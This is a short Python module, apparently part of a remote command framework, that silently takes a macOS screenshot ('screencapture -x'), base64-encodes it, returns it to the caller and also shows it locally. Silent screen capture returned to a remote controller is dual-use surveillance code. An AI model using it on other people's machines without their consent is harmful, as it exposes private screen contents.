import base64
from apps.server.modules.mod_interfaceRunCmd import mod_interfaceRunCmd
from PIL import Image

OUTPUT_FILE = "sc_tmp.png"


class mod_screenshot(mod_interfaceRunCmd):

    def setup_mod(self):
        print(f'Module Setup (mod_screenshot) called successfully!')
        pass

    def run_mod(self, cmd = ""):
        return self.take_screenshot()

    def take_screenshot(self):
        self.run_command("screencapture -x " + OUTPUT_FILE)
        image = open(OUTPUT_FILE, 'rb')
        image_read = image.read()
        image_64_encode = base64.encodebytes(image_read)
        print(f'Screenshot taken successfully!')
        with Image.open(OUTPUT_FILE) as img:
            img.show()
        return image_64_encode.decode("utf-8")
